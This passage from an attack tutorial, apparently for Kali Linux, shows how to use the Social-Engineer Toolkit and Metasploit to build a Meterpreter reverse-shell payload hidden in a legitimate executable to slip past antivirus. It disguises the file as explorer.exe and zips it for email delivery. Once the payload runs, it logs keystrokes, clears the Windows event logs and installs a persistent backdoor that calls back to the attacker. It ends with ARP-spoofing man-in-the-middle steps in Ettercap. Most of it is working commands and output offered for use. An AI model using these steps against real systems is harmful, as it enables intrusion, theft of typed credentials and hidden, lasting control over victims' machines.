### 15) Pylnjector Shellcode Injection
This technique involves dropping a Meterpreter payload using the Pylnjector tool. The payload is injected into the target process's memory, allowing for remote control and data exfiltration.

### 16) MultiPylnjector Shellcode Injection
This method allows for the injection of multiple Metasploit payloads directly into the target's memory. This can be useful for bypassing security measures and ensuring that at least one payload is successfully executed.

### 17) Import Your Own Executable
You can specify a path to your own executable file, which will then be used as the payload. This provides flexibility in customizing the attack to fit specific requirements.

---

### Payload Selection
The output displays all available payloads. Choose the appropriate payload based on your target system. For example, if the target system is Windows XP 32-bit, select the corresponding payload by entering its number:
```
set:payloads> 2
```

### Encoding Techniques
To evade basic antivirus (AV) detection, you can choose from several encoding techniques. The options include:
1. **shikata_ga_nai**: A polymorphic XOR additive feedback encoder.
2. **No Encoding**: No encoding is applied.
3. **Multi-Encoder**: Uses multiple encoders to obfuscate the payload.
4. **Backdoored Executable**: Embeds the payload within a legitimate executable to bypass AV detection.

For this example, we choose the "Backdoored Executable" option:
```
set:encoding> 4
```

### Setting Up the Listener
Next, set the port for the listener:
```
set:payloads> PORT of the listener [443]:
```

The tool will backdoor a legitimate executable to bypass antivirus detection:
```
[-] Backdooring a legit executable to bypass Anti-Virus. Wait a few seconds...
[*] Backdoor completed successfully. Payload is now hidden within a legit executable.
[*] Your payload is now in the root directory of SET as payload.exe
[-] The payload can be found in the SET home directory.
```

Start the listener:
```
set> Start the listener now? [yes|no]: yes
[-] Please wait while the Metasploit listener is loaded..
***[-]
[-] * WARNING: Database support has been disabled
***[]
```

### Configuring Metasploit
Configure the Metasploit settings:
```
resource (/root/.set/meta_config)> set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
resource (/root/.set/meta_config)> set LHOST 192.168.41.234
LHOST => 192.168.41.234
resource (/root/.set/meta_config)> set LPORT 443
LPORT => 443
resource (/root/.set/meta_config)> set EnableStageEncoding false
EnableStageEncoding => false
resource (/root/.set/meta_config)> set ExitOnSession false
ExitOnSession => false
resource (/root/.set/meta_config)> exploit -j
[*] Exploit running as background job.
msf exploit(handler) >
[*] Started reverse handler on 192.168.41.234:443
[*] Starting the payload handler..
```

### Delivering the Payload
To deliver the payload, follow these steps:
1. Navigate to the `/usr/share/set/` directory:
   ```
   root@kali:~# cd /usr/share/set/
   root@kali:/usr/share/set# ls
   modules readme seautomate setoolkit seupdate src config payload.exe README.txt seproxy setup.py seweb
   ```

2. Rename the `payload.exe` file to something less suspicious, such as `explorer.exe`:
   ```
   root@kali:/usr/share/set# mv payload.exe explorer.exe
   root@kali:/usr/share/set# ls
   ```

3. Compress the file for delivery via email:
   ```
   root@kali:/usr/share/set# zip healthfiles explorer.exe
   adding: explorer.exe (deflated 88%)
   ```

When the target user opens the file, it will establish a connection with the attacker:
```
msf exploit(handler) >
[*] Sending stage (769024 bytes) to 192.168.41.146
19:25:43 +0800
```

### Collecting Data
Once a session is established, you can collect data from the target system:
1. Activate the Meterpreter session:
   ```
   msf exploit(handler) > sessions -i 1
   [*] Starting interaction with 1..
   ```

2. Start a keylogger:
   ```
   meterpreter > keyscan_start
   Starting the keystroke sniffer...
   ```

3. Dump captured keystrokes:
   ```
   meterpreter > keyscan_dump
   Dumping captured keystrokes..
   ```

### Clearing Tracks
To clear tracks and avoid detection:
1. Start the IRB shell:
   ```
   meterpreter > irb
   [*] Starting IRB shell
   [*] The 'client' variable holds the meterpreter client
   >>
   ```

2. Clear event logs:
   ```
   >> log = client.sys.eventlog.open('system')
   >> log = client.sys.eventlog.open('security')
   >> log = client.sys.eventlog.open('application')
   >> log = client.sys.eventlog.open('directory service')
   >> log = client.sys.eventlog.open('dns server')
   >> log = client.sys.eventlog.open('file replication service')
   >> log.clear
   ```

### Creating a Persistent Backdoor
To ensure persistent access:
1. Activate the Meterpreter session:
   ```
   msf exploit(handler) > sessions -i 1
   [*] Starting interaction with 1...
   ```

2. Create a persistent backdoor:
   ```
   meterpreter > run persistence -h
   Meterpreter Script for creating a persistent backdoor on a target host.
   OPTIONS:
   -A Automatically start a matching multi/handler to connect to the agent
   -L Location in target host where to write payload to, if none %TEMP% will be used.
   -P Payload to use, default is windows/meterpreter/reverse_tcp.
   -S Automatically start the agent on boot as a service (with SYSTEM privileges)
   -X Automatically start the agent when the system boots
   -U Automatically start the agent when the User logs on
   -i The interval in seconds between each connection attempt
   -p The port on the remote host where Metasploit is listening
   -r The IP of the system running Metasploit listening for the connect back
   -h This help menu
   ```

3. Run the persistence script:
   ```
   meterpreter > run persistence -U -A -i 10 -p 8090 -r 192.168.41.234
   [*] Running Persistence Script
   [*] Resource file for cleanup created at /root/.msf4/logs/persistence/AA-886OKJM26FSW_20140507.2857/AA-886OKJM26FSW_20140507.2857.rc

### Man-in-the-Middle (MitM) Attack
A MitM attack involves intercepting and possibly altering the communication between two parties without their knowledge. Hereâ€™s how to perform a MitM attack using Ettercap:

1. **Vulnerability Analysis**:
   - ARP spoofing can occur when a host cannot find the MAC address of the target host in its cache and sends an ARP broadcast. An attacker can respond to this broadcast, posing as the target host.

2. **ARP Spoofing Principle**:
   - ARP spoofing allows an attacker to intercept and forward traffic between two hosts, enabling the attacker to control and view the data flow.

3. **Performing the MitM Attack**:
   - **Stage 1: ARP Injection**:
     - The attacker injects ARP responses to make the victim believe the attacker is the gateway or another host.
   - **Stage 2: Traffic Interception**:
     - The attacker forwards and inspects the traffic between the victim and other hosts.

### Using Ettercap for MitM
1. Start Ettercap:
   ```
   root@kali:~# ettercap -G
   ```

2. Select Unified Sniffing:
   - Go to `Sniff` > `Unified sniffing` or press `Shift+U`.

3. Choose the network interface:
   - Select the appropriate network interface.

4. Scan for hosts:
   - Go to `Hosts` > `Scan for hosts` or press `Ctrl+S`.

5. View the list of scanned hosts:
   - Go to `Hosts` > `Hosts list` or press `H`.

6. Initiate the MitM attack:
   - Configure Ettercap to perform the MitM attack and monitor the traffic.

By following these steps, you can effectively perform a MitM attack and gain control over the communication between the target hosts.
